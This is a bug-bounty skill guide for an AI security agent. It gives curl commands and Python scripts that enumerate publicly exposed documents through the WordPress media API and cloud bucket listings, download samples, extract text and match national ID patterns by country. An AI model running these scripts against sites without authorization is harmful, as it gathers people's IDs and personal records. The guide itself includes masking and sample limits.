<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: sensitive-file-pii-exposure
description: Detect and confirm publicly accessible sensitive documents (PDFs, DOCX, XLSX, images) containing PII via CMS REST APIs, cloud storage, directory listings, and misconfigured file servers — with PII extraction and country-specific ID pattern matching
---

# Sensitive File & PII Exposure via Public Document Access

Sensitive document exposure is consistently one of the highest-impact, easiest-to-confirm bug bounty findings. The pattern is always the same:
1. Application stores sensitive documents in a publicly reachable location
2. An index/enumeration mechanism (CMS REST API, S3 listing, directory index) is also public
3. Document filenames or content contain PII (names, national IDs, phone numbers, financial data)

This is classified as a HIGH/CRITICAL finding under OWASP API3 (Excessive Data Exposure) and triggers privacy regulation implications (GDPR, PDPA, CCPA, Indonesia PDP Law, etc.).

**Reasoning required:** This vulnerability class requires multi-step reasoning:
- Identify the enumeration vector (not just "file exists" — how to enumerate MANY files)
- Understand filename patterns that signal sensitive content
- Confirm content via sampling (download + extract + verify PII)
- Bound the scope (how many files, how many individuals affected)
- Assess regulatory context (which data protection law applies)

---

## STEP 1 — Identify Enumeration Vectors

The following surfaces expose file inventories unauthenticated:

```bash
TARGET="https://TARGET"

# === 1. WordPress REST API Media ===
curl -sk "$TARGET/wp-json/wp/v2/media?per_page=100&page=1" \
  -H "Accept: application/json" | python3 -m json.tool | head -50

# Filter by sensitive MIME types
for mime in "application/pdf" "application/vnd.openxmlformats-officedocument.wordprocessingml.document" "application/vnd.ms-excel" "image/jpeg"; do
  count=$(curl -sk "$TARGET/wp-json/wp/v2/media?mime_type=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$mime'))")&per_page=1" \
    -H "Accept: application/json" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 'err')" 2>/dev/null)
  echo "$mime: $count results"
done

# === 2. S3/GCS/Azure Blob Public Bucket Listing ===
# S3 bucket listing (XML index)
curl -sk "https://<bucket>.s3.amazonaws.com/?list-type=2&prefix=uploads/&max-keys=100" \
  | python3 -c "
import sys, xml.etree.ElementTree as ET
tree = ET.parse(sys.stdin)
ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
for key in tree.findall('.//s3:Key', ns):
    print(key.text)
"

# GCS public bucket
curl -sk "https://storage.googleapis.com/<bucket>?prefix=uploads/&maxResults=100" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    print(item.get('name'), item.get('mediaLink'))
"

# === 3. Directory Listing (Apache/Nginx autoindex) ===
# Check if /wp-content/uploads/ has directory listing
curl -sk "$TARGET/wp-content/uploads/" | grep -oP 'href="([^"]+\.(pdf|docx|xlsx|jpg|png))"' \
  | tr -d '"' | sed 's/href=//' | head -30

# Recursive with wget
# wget -r -l2 --no-parent -A "*.pdf,*.docx" "$TARGET/uploads/" 2>/dev/null

# === 4. Direct Cloud Storage URL Pattern Testing ===
# After finding one file URL, guess the pattern
# Example: https://cdn.target.com/uploads/consent-form-UserName-12345678.pdf
# → Try: https://cdn.target.com/uploads/ (listing?)
# → Try: https://s3-region.amazonaws.com/bucket-name/?prefix=uploads/

# === 5. sitemap.xml / robots.txt Leaking File Paths ===
curl -sk "$TARGET/sitemap.xml" | grep -oP 'https?://[^<]+\.(pdf|docx|xlsx)' | head -20
curl -sk "$TARGET/robots.txt" | grep -iE 'disallow.*upload|disallow.*document|disallow.*media'
```

---

## STEP 2 — WordPress REST API Full Media Enumeration

The `/wp-json/wp/v2/media` endpoint is the most reliable vector for WordPress targets:

```python
# tools/wp_media_enum.py
"""
Enumerate all media via WordPress REST API.
Collect: media_id, mime_type, source_url, filename, date_uploaded
Filter for: PDFs, DOCX, XLSX, and any file with a name that suggests PII.
"""
import urllib.request, urllib.error, ssl, json, re
from urllib.parse import unquote

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

TARGET = "TARGET_PLACEHOLDER"  # Replace with actual target

# PII filename patterns (apply to ALL languages/countries)
PII_FILENAME_PATTERNS = [
    # National ID / government ID patterns
    r'\b\d{12,18}\b',               # Indonesia NIK (16 digits), long ID numbers
    r'\b[A-Z]{1,2}\d{6,9}\b',       # Passport-style: A1234567
    r'\b\d{3}-\d{2}-\d{4}\b',       # US SSN format
    r'\b\d{2}\.\d{2}\.\d{2}\.\d{6}\b',  # Some EU ID formats

    # Document type keywords in filename
    r'(?i)(consent|ktp|nik|passport|id.card|identity|id.number)',
    r'(?i)(personal.data|pii|private|confidential|sensitive)',
    r'(?i)(form|agreement|contract|application)',

    # Name + number patterns (e.g., "Consent Form - John Doe - 1234567890.pdf")
    r'(?i)[a-z]+ [a-z]+ - \d{6,}',
    r'(?i)\d{6,} - [a-z]+ [a-z]+',

    # Medical / financial
    r'(?i)(medical|health|insurance|payment|invoice|salary|bank.statement)',
    r'(?i)(ssn|nric|ic.number|id.number|citizen)',
]

SENSITIVE_MIME_TYPES = [
    "application/pdf",
    "application/msword",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/vnd.ms-excel",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.ms-powerpoint",
    "text/csv",
]

def is_pii_filename(filename):
    """Check if filename suggests PII content"""
    for pattern in PII_FILENAME_PATTERNS:
        if re.search(pattern, filename):
            return True
    return False

def enumerate_media(base_url, mime_type=None, max_pages=10):
    """Enumerate all media items from WordPress REST API"""
    all_items = []
    page = 1

    while page <= max_pages:
        params = f"per_page=100&page={page}&orderby=date&order=desc"
        if mime_type:
            import urllib.parse
            params += f"&mime_type={urllib.parse.quote(mime_type)}"

        url = f"{base_url}/wp-json/wp/v2/media?{params}"
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json"
        })
        try:
            with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
                items = json.loads(r.read())
                if not items:
                    break
                all_items.extend(items)

                # Check X-WP-TotalPages header for total
                total_pages = int(r.headers.get("X-WP-TotalPages", 1))
                total_items = int(r.headers.get("X-WP-Total", 0))
                print(f"  Page {page}/{total_pages} — {len(all_items)}/{total_items} items")

                if page >= total_pages:
                    break
                page += 1
        except urllib.error.HTTPError as e:
            if e.code == 400:
                break  # No more pages
            print(f"Error: {e.code} {e.read().decode()[:100]}")
            break
        except Exception as ex:
            print(f"Error: {ex}")
            break

    return all_items

def analyze_media_items(items):
    """Filter and analyze items for PII indicators"""
    sensitive = []
    for item in items:
        src = item.get("source_url", "")
        filename = unquote(src.split("/")[-1]) if src else ""
        mime = item.get("mime_type", "")
        media_id = item.get("id", "")

        pii_flag = is_pii_filename(filename)
        sensitive_mime = mime in SENSITIVE_MIME_TYPES

        if pii_flag or sensitive_mime:
            sensitive.append({
                "id": media_id,
                "filename": filename,
                "mime": mime,
                "url": src,
                "pii_in_filename": pii_flag,
            })
    return sensitive

# Run enumeration
print(f"=== Enumerating WordPress media: {TARGET} ===")
print("\n[1] All PDFs...")
pdf_items = enumerate_media(TARGET, mime_type="application/pdf")
print(f"Total PDFs found: {len(pdf_items)}")

print("\n[2] All documents (DOCX/XLSX)...")
docx_items = enumerate_media(TARGET, mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
print(f"Total DOCX found: {len(docx_items)}")

all_sensitive = analyze_media_items(pdf_items + docx_items)
print(f"\n=== Sensitive Candidates: {len(all_sensitive)} ===")
for item in all_sensitive[:20]:
    print(f"  [{'PII' if item['pii_in_filename'] else 'DOC'}] {item['filename']}")
    print(f"    URL: {item['url']}")
    print(f"    Media ID: {item['id']}")

# Save for step 3
with open("output/wp_sensitive_media.json", "w") as f:
    json.dump(all_sensitive, f, indent=2)
print(f"\nSaved to output/wp_sensitive_media.json")
```

```bash
# Replace TARGET_PLACEHOLDER with actual target, then run:
sed -i 's|TARGET_PLACEHOLDER|https://TARGET|' tools/wp_media_enum.py
python3 tools/wp_media_enum.py | tee output/wp_media_enum.txt
```

---

## STEP 3 — Confirm PII by Downloading and Extracting Document Content

```python
# tools/confirm_pii_in_docs.py
"""
Download a sample of flagged documents and extract text to confirm PII.
Uses pdftotext for PDFs, python-docx for DOCX, openpyxl for XLSX.
Masks sensitive values in output (report-safe).
"""
import json, re, subprocess, tempfile, os, ssl, urllib.request, urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# PII field labels (multilingual) — add more as needed
PII_FIELD_LABELS = {
    # Indonesian
    "nama_lengkap": r'[Nn]ama\s+[Ll]engkap[\s\S]{0,50}?(?:KTP|:)',
    "nik": r'\bNIK\b[\s:]*',
    "ktp": r'\bKTP\b[\s:]*',
    "tanggal_lahir": r'(?i)tanggal\s+lahir[\s:]*',
    "alamat": r'(?i)alamat[\s:]*',
    "no_hp": r'(?i)(?:no\.?\s*hp|nomor\s+telepon|phone)[\s:]*',
    # English
    "full_name": r'(?i)(?:full\s+name|name\s+\(.*?\))[\s:]*',
    "national_id": r'(?i)(?:national\s+id|id\s+number|identity\s+number)[\s:]*',
    "date_of_birth": r'(?i)(?:date\s+of\s+birth|dob|born)[\s:]*',
    "email": r'(?i)e-?mail\s*address[\s:]*',
    "phone": r'(?i)(?:phone|mobile|contact\s+number)[\s:]*',
    # Financial
    "account_number": r'(?i)(?:account\s+number|bank\s+account|rekening)[\s:]*',
    "card_number": r'(?i)(?:card\s+number|credit\s+card|debit\s+card)[\s:]*',
}

# PII value patterns for masking
MASK_PATTERNS = [
    (r'\b(\d{4})\d{8,10}(\d{4})\b', r'\1…\2'),      # 16-digit ID: show first 4 + last 4
    (r'\b(\d{3})-\d{2}-(\d{4})\b', r'\1-xx-\2'),     # US SSN
    (r'\b([A-Za-z0-9._%+-]+)@([A-Za-z0-9.-]+\.[a-z]{2,})\b',
     lambda m: m.group(1)[:2] + "***@" + m.group(2)),  # Email
    (r'\b(\+?\d{1,3}[\s-]?)(\d{3,4})[\s-]?\d{3,4}[\s-]?\d{4}\b',
     r'\1\2-****'),                                     # Phone
]

def mask_pii(text):
    """Apply PII masking for safe output/reporting"""
    for pattern, replacement in MASK_PATTERNS:
        if callable(replacement):
            text = re.sub(pattern, replacement, text)
        else:
            text = re.sub(pattern, replacement, text)
    return text

def extract_pdf_text(pdf_bytes):
    """Extract text from PDF using pdftotext"""
    with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
        f.write(pdf_bytes)
        tmp_path = f.name
    try:
        result = subprocess.run(
            ['pdftotext', tmp_path, '-'],
            capture_output=True, timeout=30
        )
        return result.stdout.decode('utf-8', 'ignore')
    except FileNotFoundError:
        # Fallback: try strings command
        result = subprocess.run(['strings', tmp_path], capture_output=True)
        return result.stdout.decode('utf-8', 'ignore')
    finally:
        os.unlink(tmp_path)

def extract_docx_text(docx_bytes):
    """Extract text from DOCX"""
    try:
        import zipfile, io
        with zipfile.ZipFile(io.BytesIO(docx_bytes)) as z:
            with z.open('word/document.xml') as doc:
                xml = doc.read().decode('utf-8', 'ignore')
                # Strip XML tags
                text = re.sub(r'<[^>]+>', ' ', xml)
                return ' '.join(text.split())
    except Exception as ex:
        return f"Error: {ex}"

def confirm_pii_in_document(url, mime_type):
    """Download document and confirm PII presence"""
    result = {"url": url, "pii_found": [], "excerpt": ""}

    # Encode URL properly
    from urllib.parse import quote, unquote, urlparse
    parsed = urlparse(url)
    safe_path = '/'.join(quote(unquote(seg), safe='') for seg in parsed.path.split('/'))
    safe_url = f"{parsed.scheme}://{parsed.netloc}{safe_path}"

    try:
        req = urllib.request.Request(safe_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
            doc_bytes = r.read()
    except Exception as ex:
        result["error"] = str(ex)
        return result

    # Extract text
    if "pdf" in mime_type:
        text = extract_pdf_text(doc_bytes)
    elif "docx" in mime_type or "wordprocessing" in mime_type:
        text = extract_docx_text(doc_bytes)
    else:
        text = doc_bytes.decode('utf-8', 'ignore')

    # Check for PII field labels
    for label, pattern in PII_FIELD_LABELS.items():
        match = re.search(pattern, text)
        if match:
            # Get context around match (20 chars before, 40 chars after)
            start = max(0, match.start() - 10)
            end = min(len(text), match.end() + 50)
            context = text[start:end].replace('\n', ' ').strip()
            result["pii_found"].append({
                "field": label,
                "context": mask_pii(context)
            })

    # Generate masked excerpt
    masked_text = mask_pii(text)
    lines = [l.strip() for l in masked_text.splitlines() if l.strip()]
    result["excerpt"] = "\n".join(lines[:15])
    result["total_text_length"] = len(text)

    return result

# Load candidates from step 2
with open("output/wp_sensitive_media.json") as f:
    candidates = json.load(f)

print(f"=== Confirming PII in {min(5, len(candidates))} sample documents ===")
confirmed = []

for item in candidates[:5]:  # Sample first 5
    print(f"\nChecking: {item['filename']}")
    result = confirm_pii_in_document(item['url'], item['mime'])

    if result.get("pii_found"):
        print(f"  [PII CONFIRMED] Fields found: {[p['field'] for p in result['pii_found']]}")
        for pii in result["pii_found"]:
            print(f"    {pii['field']}: {pii['context']}")
        confirmed.append({**item, "pii_confirmed": True, "pii_fields": result["pii_found"]})
    else:
        print(f"  [NO PII] Text length: {result.get('total_text_length', 0)}")
        print(f"  Excerpt: {result.get('excerpt', '')[:200]}")

print(f"\n=== CONFIRMED: {len(confirmed)}/{min(5, len(candidates))} documents contain PII ===")
with open("output/pii_confirmed.json", "w") as f:
    json.dump(confirmed, f, indent=2)
```

```bash
python3 tools/confirm_pii_in_docs.py | tee output/pii_confirmation.txt
```

---

## STEP 4 — Quantify Scope (Total Affected Individuals)

```python
# tools/quantify_pii_scope.py
"""
Estimate how many individuals are affected.
Strategy: count total documents, analyze filename uniqueness patterns,
estimate unique individuals from naming conventions.
"""
import json, re
from urllib.parse import unquote

with open("output/wp_sensitive_media.json") as f:
    items = json.load(f)

# Analyze filename patterns to estimate unique individuals
unique_id_patterns = set()
files_with_ids = 0

for item in items:
    fn = item.get("filename", "")
    ids = re.findall(r'\b\d{12,18}\b', fn)
    if ids:
        unique_id_patterns.update(ids)
        files_with_ids += 1

print(f"Total sensitive documents: {len(items)}")
print(f"Documents with ID numbers in filename: {files_with_ids}")
print(f"Unique ID numbers found in filenames: {len(unique_id_patterns)}")
print(f"Estimated unique individuals affected: {len(unique_id_patterns)} (minimum)")
print(f"\nNote: If multiple documents per person exist, actual individuals = {files_with_ids}")

# Check total across all pages (from X-WP-Total header)
# This was saved during enumeration
print(f"\nImpact assessment:")
if len(items) > 0:
    print(f"  - At minimum {len(items)} sensitive documents publicly accessible")
    print(f"  - Enumerable via unauthenticated GET to /wp-json/wp/v2/media")
    print(f"  - All documents downloadable without authentication")
    if unique_id_patterns:
        print(f"  - At least {len(unique_id_patterns)} individuals' national ID numbers exposed")
```

```bash
python3 tools/quantify_pii_scope.py
```

---

## STEP 5 — Country-Specific PII Pattern Reference

Adjust detection patterns based on target's country:

```python
# tools/pii_patterns_by_country.py

COUNTRY_PII_PATTERNS = {
    "Indonesia": {
        "NIK": r'\b\d{16}\b',                          # 16-digit National ID
        "KK": r'\b\d{16}\b',                            # Family card number
        "passport": r'\bA[0-9]{7}\b',                  # Indonesian passport
        "phone": r'\+62[0-9]{9,11}|0[0-9]{9,11}',
        "keywords": ["NIK", "KTP", "Kartu Tanda Penduduk", "Nama Lengkap (Sesuai KTP)",
                     "NPWP", "SIM", "Akta Lahir"],
        "regulation": "UU PDP (Personal Data Protection Law) 2022",
        "base_penalty": "IDR 5 billion per violation"
    },
    "Singapore": {
        "NRIC": r'\b[STFGM]\d{7}[A-Z]\b',             # Singaporean IC
        "FIN": r'\b[FG]\d{7}[A-Z]\b',
        "passport": r'\bE[0-9]{7}[A-Z]\b',
        "keywords": ["NRIC", "FIN", "Identity Card No", "IC Number"],
        "regulation": "PDPA 2012 (Personal Data Protection Act)",
        "base_penalty": "SGD 1 million per violation"
    },
    "Malaysia": {
        "MyKAD": r'\b\d{6}-\d{2}-\d{4}\b',            # XXXXXX-YY-ZZZZ
        "passport": r'\bA[0-9]{8}\b',
        "keywords": ["No. Kad Pengenalan", "MyKAD", "IC Number"],
        "regulation": "PDPA 2010 (Personal Data Protection Act)",
        "base_penalty": "MYR 500,000"
    },
    "Philippines": {
        "PhilSys": r'\b\d{4}-\d{4}-\d{4}\b',          # Philippine System Number
        "SSS": r'\b\d{2}-\d{7}-\d{1}\b',
        "keywords": ["PSN", "PhilSys ID", "SSS Number", "TIN"],
        "regulation": "Data Privacy Act 2012 (RA 10173)",
        "base_penalty": "PHP 5 million per violation"
    },
    "India": {
        "Aadhaar": r'\b[2-9]{1}[0-9]{11}\b',           # 12-digit Aadhaar (starts 2-9)
        "PAN": r'\b[A-Z]{5}[0-9]{4}[A-Z]{1}\b',       # Permanent Account Number
        "passport": r'\b[A-Z][1-9][0-9]{7}\b',
        "keywords": ["Aadhaar", "PAN", "Passport No", "Voter ID"],
        "regulation": "DPDP Act 2023 / IT Act",
        "base_penalty": "INR 250 crore per violation"
    },
    "EU/EEA": {
        "passport": r'\b[A-Z]{2}[0-9]{7}\b',
        "keywords": ["Personalausweis", "Passport", "ID Card", "DNI", "CIF", "NIF"],
        "regulation": "GDPR (Regulation 2016/679)",
        "base_penalty": "4% of annual global revenue"
    },
    "USA": {
        "SSN": r'\b\d{3}-\d{2}-\d{4}\b',
        "DL": r'\b[A-Z]{1,2}\d{6,8}\b',               # Driver's license varies by state
        "keywords": ["Social Security", "SSN", "Driver License", "EIN"],
        "regulation": "CCPA / HIPAA / FCRA (varies by state/sector)",
        "base_penalty": "CCPA: $7,500 per intentional violation"
    }
}

def get_pii_context(target_country, pii_text):
    """
    Given country and confirmed PII, generate regulatory impact context
    for the vulnerability report.
    """
    ctx = COUNTRY_PII_PATTERNS.get(target_country, COUNTRY_PII_PATTERNS["EU/EEA"])
    return {
        "regulation": ctx["regulation"],
        "penalty": ctx["base_penalty"],
        "keywords_to_look_for": ctx["keywords"]
    }

# Usage:
country = "Indonesia"  # Determine from target's domain, language, or content
impact = get_pii_context(country, "")
print(f"Applicable regulation: {impact['regulation']}")
print(f"Max penalty: {impact['penalty']}")
print(f"PII fields to confirm: {impact['keywords_to_look_for']}")
```

---

## Full Attack Surface Coverage

### CMS Targets
| CMS | Enumeration Endpoint | Sensitive Filter |
|-----|---------------------|------------------|
| WordPress | `/wp-json/wp/v2/media?mime_type=application/pdf` | mime_type filter |
| Drupal | `/jsonapi/file/file?filter[mime]=application/pdf` | JSONAPI filter |
| Strapi | `/api/upload/files?filters[mime][$eq]=application/pdf` | Filters API |
| Ghost | `/ghost/api/v3/content/files/` | (requires key) |
| Contentful | `/spaces/{id}/assets?mimetype_group=pdfdocument` | Content delivery API |

### Cloud Storage Targets
```bash
# S3 public bucket with listing
curl -s "https://BUCKET.s3.amazonaws.com/?list-type=2&prefix=consent&max-keys=100"

# GCS with public listing
curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/o?prefix=consent&maxResults=100&key=AIza..."

# Azure Blob with $web container
curl -s "https://ACCOUNT.blob.core.windows.net/documents?restype=container&comp=list&prefix=consent"
```

---

## Validation Requirements for Report

1. **Enumerate:** Show the GET request to the media endpoint with response showing multiple PDF URLs
2. **Filename analysis:** Show that filenames contain patterns consistent with PII (long digit strings, person names)
3. **Content confirmation:** Download ONE sample document, extract text, show masked PII fields
4. **Scope quantification:** Show total count of affected documents (`X-WP-Total` header)
5. **Mask all real PII in report** — show only first/last 4 digits of national IDs, first 2 chars of names
6. **Regulatory context:** Name the applicable privacy law and note the violation

---

## False Positives

- **Public marketing PDFs with no PII** — filename analysis says "sensitive" but content is a brochure
- **Sample/template forms** — forms with placeholder names like "Full Name Here" (not real data)
- **Forms where PII is redacted** — confirm full PII is actually present, not just field labels
- **CDN-cached files that no longer exist at origin** — verify the file is still downloadable

---

## Pro Tips

1. **`X-WP-Total` header** reveals total document count before downloading anything — use this to quantify scope in the report without enumerating all files
2. **Filename patterns are probabilistic, not definitive** — always confirm 1-3 samples before claiming PII exposure
3. **pdftotext is the most reliable extraction tool** — install it: `apt-get install poppler-utils`. Alternative: `strings <file>.pdf | grep -E 'NIK|Nama|KTP'`
4. **Check page 1-3 for max impact** — most recent uploads (page 1) are often the most recently submitted and contain the freshest PII
5. **Regulatory context amplifies severity** — A finding is "MEDIUM information disclosure" without PII context but becomes "HIGH data protection violation" with confirmed PII + applicable law
6. **Never download more than necessary** — Download 3-5 samples maximum. The point is confirmation, not bulk collection. Bulk collection could be illegal.
